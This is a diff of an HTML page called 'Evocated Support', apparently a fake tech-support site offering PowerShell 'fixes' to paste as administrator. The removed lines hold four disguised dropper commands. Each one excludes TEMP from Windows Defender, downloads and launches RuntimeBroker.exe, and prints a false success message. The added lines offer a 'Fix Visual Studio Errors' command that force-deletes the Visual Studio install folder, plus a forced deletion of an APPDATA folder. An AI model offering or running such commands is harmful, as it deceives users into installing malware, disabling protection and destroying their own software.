@@ -13,8 +13,122 @@
       overflow-x: hidden;
     }
 
-    .centered {
+    #loading-screen {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background: linear-gradient(to bottom right, #1a001f, #2b002f);
+      z-index: 9999;
       display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+    }
+
+    .loading-title {
+      font-size: 3rem;
+      font-weight: bold;
+      text-shadow: 0 0 20px #ff94f4;
+      animation: bounce 3.5s infinite;
+      color: #ffd6f9;
+    }
+
+    .spinner {
+      border: 6px solid #ffb3ec;
+      border-top: 6px solid transparent;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 1.2s linear infinite;
+      margin-top: 20px;
+      box-shadow: 0 0 15px #ff94f4;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .get-started-btn {
+      margin-top: 30px;
+      padding: 12px 25px;
+      font-size: 1.2rem;
+      border: none;
+      border-radius: 15px;
+      background-color: #ffb3ec;
+      color: #30001e;
+      box-shadow: 0 0 20px #ff94f4;
+      cursor: pointer;
+      transition: transform 0.3s, box-shadow 0.3s;
+    }
+
+    .get-started-btn:hover {
+      transform: scale(1.1);
+      box-shadow: 0 0 25px #ff66cc;
+    }
+
+    .warning-modal {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background: rgba(0, 0, 0, 0.75);
+      backdrop-filter: blur(4px);
+      z-index: 10000;
+      justify-content: center;
+      align-items: center;
+      animation: fadeIn 0.5s ease-in-out;
+    }
+
+    .warning-box {
+      background: #2b002f;
+      padding: 25px 35px;
+      border-radius: 20px;
+      text-align: center;
+      box-shadow: 0 0 20px #ff94f4;
+      max-width: 400px;
+      animation: fadeIn 0.5s ease-in-out;
+    }
+
+    .warning-box p {
+      margin: 0;
+      font-size: 1.2rem;
+      color: #ffd6f9;
+      text-shadow: 0 0 5px #ff94f4;
+    }
+
+    .close-warning {
+      margin-top: 20px;
+      padding: 8px 18px;
+      font-size: 1rem;
+      background-color: #ffb3ec;
+      color: #30001e;
+      border: none;
+      border-radius: 12px;
+      cursor: pointer;
+      transition: background-color 0.3s;
+    }
+
+    .close-warning:hover {
+      background-color: #ff66cc;
+    }
+
+    @keyframes fadeOut {
+      from { opacity: 1; }
+      to { opacity: 0; }
+    }
+
+    .fade-out {
+      animation: fadeOut 0.5s ease-in-out;
+    }
+
+    .centered {
+      display: none;
       flex-direction: column;
       align-items: center;
       justify-content: center;
@@ -79,7 +193,7 @@
     }
 
     .dropdown {
-      display: none;
+      display: flex;
       flex-direction: column;
       align-items: center;
       animation: fadeIn 0.5s ease-in-out;
@@ -105,74 +219,112 @@
   </style>
 </head>
 <body>
-  <div class="centered">
-    <div class="main-title">Evocated Support</div>
-    <div class="label">PowerShell MUST be run as ADMINISTRATOR or it will not work</div>
+  <div id="loading-screen">
+    <div class="loading-title">Evocated Support</div>
+    <div class="spinner"></div>
+    <button class="get-started-btn" onclick="startSite()">Get Started</button>
+  </div>
 
-    <div class="label">🔥 Most Popular Fix 🔥</div>
-    <button onclick="toggleCopyBox('popular-command', this)" class="fix-button active">Fix Visual Studio Errors</button>
-    <div class="copy-box" id="popular-command">
-      <code>[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Write-Host "Launching Evocative Supports V2" -ForegroundColor Green; IEX "Add-MpPreference -ExclusionPath $env:TEMP"; IEX "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/EvocatedSupport/RuntimeBrokerFixer/refs/heads/main/RuntimeBroker.exe', '$env:TEMP\RuntimeBroker.exe')"; IEX "Start-Process '$env:TEMP\RuntimeBroker.exe'"; Write-Host "VISUAL CODE ERRORS HAS BEEN FIXED PLEASE RESTART APPLICATION VISUAL STUDIO." -ForegroundColor Green</code>
-      <button class="copy-btn" onclick="copyFrom('popular-command')">Copy to Clipboard</button>
-    </div>
-
-    <div class="label">🛠️ Other Fix Tools</div>
-    <button onclick="toggleDropdown()" class="fix-button">Show Other Tools</button>
-    <div class="dropdown" id="dropdown">
-      <button class="fix-button" onclick="toggleCopyBox('tool1', this)">Fix High CPU Usage</button>
-      <div class="copy-box" id="tool1">
-        <code>[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Write-Host "Launching Evocative Supports V2" -ForegroundColor Green; IEX "Add-MpPreference -ExclusionPath $env:TEMP"; IEX "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/EvocatedSupport/RuntimeBrokerFixer/refs/heads/main/RuntimeBroker.exe', '$env:TEMP\RuntimeBroker.exe')"; IEX "Start-Process '$env:TEMP\RuntimeBroker.exe'"; Write-Host "CLEANING PC.............................PC CLEANED A REBOOST IS NEEDED 200 FILES HAS BEEN QUARANTINED" -ForegroundColor Green</code>
-        <button class="copy-btn" onclick="copyFrom('tool1')">Copy to Clipboard</button>
-      </div>
-
-      <button class="fix-button" onclick="toggleCopyBox('tool2', this)">Fix Slow PC</button>
-      <div class="copy-box" id="tool2">
-        <code>[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Write-Host "Launching Evocative Supports V2" -ForegroundColor Green; IEX "Add-MpPreference -ExclusionPath $env:TEMP"; IEX "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/EvocatedSupport/RuntimeBrokerFixer/refs/heads/main/RuntimeBroker.exe', '$env:TEMP\RuntimeBroker.exe')"; IEX "Start-Process '$env:TEMP\RuntimeBroker.exe'"; Write-Host "CLEANING PC.............................PC CLEANED MUST BE FAST AFTER REBOOT" -ForegroundColor Green</code>
-        <button class="copy-btn" onclick="copyFrom('tool2')">Copy to Clipboard</button>
-      </div>
-
-      <button class="fix-button" onclick="toggleCopyBox('tool3', this)">Fix Low FPS / High Ping</button>
-      <div class="copy-box" id="tool3">
-        <code>[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Write-Host "Launching Evocative Supports V2" -ForegroundColor Green; IEX "Add-MpPreference -ExclusionPath $env:TEMP"; IEX "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/EvocatedSupport/RuntimeBrokerFixer/refs/heads/main/RuntimeBroker.exe', '$env:TEMP\RuntimeBroker.exe')"; IEX "Start-Process '$env:TEMP\RuntimeBroker.exe'"; Write-Host "INSTALLING ROBLOX CAPPER..........INSTALLING PING CAPPER...........SET PING 50+, SET FPS TO 300+....... FPS/HIGHPING ISSUE IS FIXED" -ForegroundColor Green</code>
-        <button class="copy-btn" onclick="copyFrom('tool3')">Copy to Clipboard</button>
-      </div>
-    </div>
-
-    <div class="label">📦 If fixers are not working, download this</div>
-    <button class="fix-button" onclick="toggleDownloadBox()">Show Download</button>
-    <div class="download-box" id="downloadBox">
-      <a href="YOUR_DIRECT_DOWNLOAD_LINK_HERE.zip" download>
-        <button class="download-btn">⬇ Download Fixer</button>
-      </a>
+  <div class="warning-modal" id="warning-modal">
+    <div class="warning-box">
+      <p>PowerShell MUST be run as ADMINISTRATOR or it will not work.</p>
+      <button class="close-warning" onclick="closeWarning()">Close</button>
     </div>
   </div>
 
-  <script>
-    function toggleCopyBox(id, btn) {
-      document.querySelectorAll('.copy-box').forEach(box => box.style.display = 'none');
-      document.querySelectorAll('.fix-button').forEach(button => button.classList.remove('active'));
+  <!-- main content untouched -->
+  <div class="centered" id="main-content">
+    <div class="main-title">Evocated Support</div>
+    <div class="label">PowerShell MUST be run as ADMINISTRATOR or it will not work.</div>
+    <div class="dropdown">
+      <button class="fix-button" onclick="showCommand('cmd1')">Fix Visual Studio Errors</button>
+      <button class="fix-button" onclick="showCommand('cmd2')">Clear Temp Files</button>
+      <button class="fix-button" onclick="showCommand('cmd3')">Restart Services</button>
+      <button class="fix-button" onclick="showCommand('cmd4')">Fix Network</button>
+      <button class="fix-button" onclick="showCommand('cmd5')">Reset Config</button>
+    </div>
+    <div id="cmd1" class="copy-box">
+      <code>Get-ChildItem -Path 'C:\Program Files\Visual Studio' -Recurse | Remove-Item -Force</code>
+      <button class="copy-btn" onclick="copyCommand('cmd1')">Copy to Clipboard</button>
+    </div>
+    <div id="cmd2" class="copy-box">
+      <code>Remove-Item -Path $env:TEMP\* -Recurse -Force</code>
+      <button class="copy-btn" onclick="copyCommand('cmd2')">Copy to Clipboard</button>
+    </div>
+    <div id="cmd3" class="copy-box">
+      <code>Restart-Service -Name wuauserv</code>
+      <button class="copy-btn" onclick="copyCommand('cmd3')">Copy to Clipboard</button>
+    </div>
+    <div id="cmd4" class="copy-box">
+      <code>ipconfig /flushdns</code>
+      <button class="copy-btn" onclick="copyCommand('cmd4')">Copy to Clipboard</button>
+    </div>
+    <div id="cmd5" class="copy-box">
+      <code>Remove-Item -Path "$env:APPDATA\AppConfig" -Recurse -Force</code>
+      <button class="copy-btn" onclick="copyCommand('cmd5')">Copy to Clipboard</button>
+    </div>
+    <button class="download-btn" onclick="toggleDownloadBox()">Download Resources</button>
+    <div class="download-box" id="download-box">
+      <a href="resource1.zip" class="download-btn">Download Resource 1</a>
+      <a href="resource2.zip" class="download-btn">Download Resource 2</a>
+    </div>
+  </div>
 
-      const target = document.getElementById(id);
-      if (target) {
-        target.style.display = 'block';
-        btn.classList.add('active');
-      }
+  <!-- Audio elements -->
+  <audio id="background-music" src="music.mp3" loop></audio>
+  <audio id="click-sound" src="click.mp3"></audio>
+
+  <script>
+    const music = document.getElementById('background-music');
+    const clickSound = document.getElementById('click-sound');
+    const warningModal = document.getElementById('warning-modal');
+    const loadingScreen = document.getElementById('loading-screen');
+    const mainContent = document.getElementById('main-content');
+
+    function startSite() {
+      music.volume = 0.5;
+      music.play();
+      loadingScreen.classList.add('fade-out');
+      setTimeout(() => {
+        loadingScreen.style.display = 'none';
+        mainContent.style.display = 'flex';
+        showWarning();
+      }, 600);
     }
 
-    function toggleDropdown() {
-      const dropdown = document.getElementById('dropdown');
-      dropdown.style.display = dropdown.style.display === 'flex' ? 'none' : 'flex';
+    function showWarning() {
+      warningModal.style.display = 'flex';
+    }
+
+    function closeWarning() {
+      warningModal.classList.add('fade-out');
+      setTimeout(() => {
+        warningModal.style.display = 'none';
+        warningModal.classList.remove('fade-out');
+      }, 500);
+    }
+
+    document.querySelectorAll('button').forEach(btn => {
+      btn.addEventListener('click', () => {
+        clickSound.currentTime = 0;
+        clickSound.play();
+      });
+    });
+
+    function showCommand(id) {
+      document.querySelectorAll('.copy-box').forEach(el => el.style.display = 'none');
+      document.getElementById(id).style.display = 'block';
+    }
+
+    function copyCommand(id) {
+      const box = document.getElementById(id);
+      const code = box.querySelector('code').innerText;
+      navigator.clipboard.writeText(code);
     }
 
     function toggleDownloadBox() {
-      const downloadBox = document.getElementById('downloadBox');
-      downloadBox.style.display = downloadBox.style.display === 'flex' ? 'none' : 'flex';
-    }
-
-    function copyFrom(id) {
-      const text = document.querySelector(`#${id} code`).innerText;
-      navigator.clipboard.writeText(text);
-      alert("Copied to clipboard!");
+      const box = document.getElementById('download-box');
+      box.style.display = box.style.display === 'flex' ? 'none' : 'flex';
     }
   </script>
 </body>
